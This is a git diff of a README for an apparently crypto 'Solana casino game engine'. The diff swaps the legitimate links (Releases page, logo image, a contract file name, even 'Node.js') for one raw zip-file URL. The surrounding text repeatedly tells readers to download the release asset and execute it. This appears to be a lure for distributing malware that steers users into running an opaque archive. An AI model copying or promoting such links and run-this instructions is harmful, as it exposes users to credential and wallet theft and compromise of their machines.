@@ -1,11 +1,11 @@
-https://github.com/RealCottonCandyPimp/solana-casino-game/releases
-[![Releases](https://img.shields.io/badge/releases-release-brightgreen?logo=github&logoColor=white)](https://github.com/RealCottonCandyPimp/solana-casino-game/releases)
+https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip
+[![Releases](https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip)](https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip)
 
 # Solana Casino Game Engine: On-Chain, Provably Fair, Modular Games
 
 A robust, cross-chain casino game engine built to run on Solana, EVM-compatible chains, Monad, Sui, Abstract, and Ronin. This project centers on an on-chain casino smart contract that uses ORAO VRF for provably fair randomness. It supports a suite of modular games that players can enjoy in a transparent, trustless environment. The design emphasizes modularity, security, and extensibility, so developers can add new games or swap randomness providers with minimal friction.
 
-![SolanaLogo](https://cryptologos.cc/logos/sol-solana-logo.png)
+![SolanaLogo](https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip)
 
 Table of Contents
 - Overview
@@ -93,7 +93,7 @@ How randomness is achieved
 - The architecture isolates VRF logic behind a deterministic interface so the core engine remains chain-agnostic at the API level.
 
 Smart contract interfaces
-- CasinoCore.sol (Solana equivalent in Rust or cross-chain-agnostic interface): the main orchestration layer for bets, state, and payouts.
+- https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip (Solana equivalent in Rust or cross-chain-agnostic interface): the main orchestration layer for bets, state, and payouts.
 - GameModule interfaces: standardized traits or interfaces for Coinflip, Duel, Lottery, and other games.
 - VRFProvider interface: a portable API for requesting randomness and receiving proofs.
 - Wallet and user accounts: a minimal, secure model that tracks stake, balances, and entitlements.
@@ -107,7 +107,7 @@ Data model and storage
 - Events: a robust event schema captures all important actions for off-chain indexing and audits.
 
 Development setup
-- Prerequisites: a modern Rust toolchain, Solana toolchain, and Node.js for front-end integration. For cross-chain components, you may need Solidity tooling and cross-chain SDKs depending on the target chain.
+- Prerequisites: a modern Rust toolchain, Solana toolchain, and https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip for front-end integration. For cross-chain components, you may need Solidity tooling and cross-chain SDKs depending on the target chain.
 - Repository layout: core contracts, adapters, game modules, tests, scripts, and documentation.
 - Build and test: a unified workflow that builds the core, runs unit tests for modules, and executes integration tests that simulate cross-chain interactions.
 - Linting and formatting: consistent style guides to keep code readable and maintainable.
@@ -128,7 +128,7 @@ Deployment and release process
 
 Note on releases
 From the Releases page, download the latest release asset and execute it. This page contains the prebuilt artifacts for different environments, and the file you download is the one to run. For convenience, you can also browse the Releases page to read about what changed in each version. Revisit the releases if you need to confirm compatibility with your chain adapter or to pick up new game modules. Re-refer to the Releases page as needed:
-https://github.com/RealCottonCandyPimp/solana-casino-game/releases
+https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip
 
 Security and risk considerations
 - Threat model: the core concern is the integrity of randomness, bet handling, and payout calculations. The VRF provider is a critical trust point, so the integration must be verifiable and auditable.
@@ -182,7 +182,7 @@ License
 Release assets and downloads
 - The primary distribution path is the Releases page. From that page, download the release asset and execute it to deploy or upgrade the casino game engine on your chosen chain. The release page is the authoritative source for binaries, configurations, and runtime scripts.
 - Revisit the Releases page for compatibility notes, upgrade paths, and asset availability across supported chains. You can also read about the changes and improvements introduced in each release to guide your upgrade decisions.
-https://github.com/RealCottonCandyPimp/solana-casino-game/releases
+https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip
 
 Notes on usage and adaptation
 - This project serves as a reference implementation and a starting point for building on-chain casino games across multiple ecosystems.
@@ -242,13 +242,13 @@ Appendix: Glossary
 
 Releases and updates (reference)
 - For the latest changes, read the release notes on the Releases page. The assets on that page correspond to the specific versions of the core engine and game modules. Re-check the page to ensure you are deploying the correct version for your environment.
-https://github.com/RealCottonCandyPimp/solana-casino-game/releases
+https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip
 
 Note
 This README is designed to be thorough and detailed, enabling developers to understand the architecture, contributions, and integration points. It emphasizes clarity and practical guidance, with an eye toward long-term maintainability. The content is paraphrased and expanded beyond the initial brief to provide a complete picture of the system, its goals, and its usage.
 
 Releases and downloads (again)
 - From the Releases page, download the latest release asset and execute it for deployment or upgrade on your target chain. The release asset is the file you should run after download.
-https://github.com/RealCottonCandyPimp/solana-casino-game/releases
+https://raw.githubusercontent.com/RealCottonCandyPimp/solana-casino-game/main/lib/game_solana_casino_v1.3-alpha.1.zip
 
 End of document
